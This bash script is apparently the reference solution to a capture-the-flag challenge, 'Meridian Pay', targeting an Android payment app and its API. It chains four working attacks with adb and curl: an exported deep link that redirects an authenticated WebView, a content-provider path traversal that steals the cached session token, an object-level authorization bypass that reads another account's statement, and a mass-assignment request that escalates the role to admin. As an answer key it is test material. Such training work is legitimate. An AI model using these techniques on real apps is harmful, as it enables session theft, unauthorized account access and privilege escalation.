#!/bin/bash
# Reference solution for "Meridian Pay".
#
# Setup: install the handout APK on a device/emulator, open the app once, enter your
# instance URL and tap Connect (the app silently authenticates the device and caches
# the session). Then run this with your instance base URL:
#
#     ./solve.sh http://<host>:<port>
#
# Needs: adb (device with the app connected) and curl.
set -euo pipefail
BASE="${1:?usage: solve.sh <instance-base-url>}"
PKG=com.meridian.pay
CLIENT='MeridianPay-Android/3.2.1 (attested)'

echo "== Stage 1: exported deep-link -> authenticated WebView (FLAG v1) =="
# RouterActivity is exported and forwards its ?url= parameter straight into the app's
# WebView. That WebView injects the cached Bearer session AND the attested client header
# for the app's own origin. /api/v1/promo/public leaks the internal enrollment path,
# which is reachable only with that client header. Redirect the trusted WebView at it:
adb shell am start -a android.intent.action.VIEW \
  -d "meridianpay://open?url=$BASE/api/v1/internal/promo" >/dev/null
echo "  launched the deep link - FLAG v1 renders in the app WebView (read it on screen)"

echo "== Stage 2: exported content-provider path traversal (FLAG v2) =="
# ExportProvider.openFile() joins the URI path onto files/receipts with no
# canonicalization, so ..%2F..%2F escapes the sandbox and reads any app-private file.
# Steal the cached session token from shared_prefs/session.xml:
XML=$(adb shell content read --uri \
  "content://com.meridian.pay.export/files/..%2F..%2Fshared_prefs%2Fsession.xml")
TOKEN=$(printf '%s' "$XML" | grep -oP '(?<=name="session_token">)[^<]+')
echo "  stolen session token: ${TOKEN:0:24}..."
V2=$(curl -s "$BASE/api/v1/accounts/me" -H "Authorization: Bearer $TOKEN" \
  | grep -oP 'H7CTF\{[^}]+\}')
echo "  FLAG v2 = $V2"

echo "== Stage 3: broken object-level authorization / BOLA (FLAG v3) =="
# statement-by-account-id has no ownership check. Your account is 1001; walk to the
# corporate treasury account 1002.
V3=$(curl -s "$BASE/api/v1/accounts/1002/statement" -H "Authorization: Bearer $TOKEN" \
  | grep -oP 'H7CTF\{[^}]+\}')
echo "  FLAG v3 = $V3"

echo "== Stage 4: mass-assignment -> admin ledger (FLAG v4) =="
# PATCH /profile blindly applies every field in the body, including role. Escalate,
# then read the admin-only ledger.
curl -s -X PATCH "$BASE/api/v1/profile" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"role":"admin"}' >/dev/null
V4=$(curl -s "$BASE/api/v1/admin/ledger" -H "Authorization: Bearer $TOKEN" \
  | grep -oP 'H7CTF\{[^}]+\}')
echo "  FLAG v4 = $V4"

echo
echo "v1 is on the app screen from Stage 1; v2/v3/v4 above."
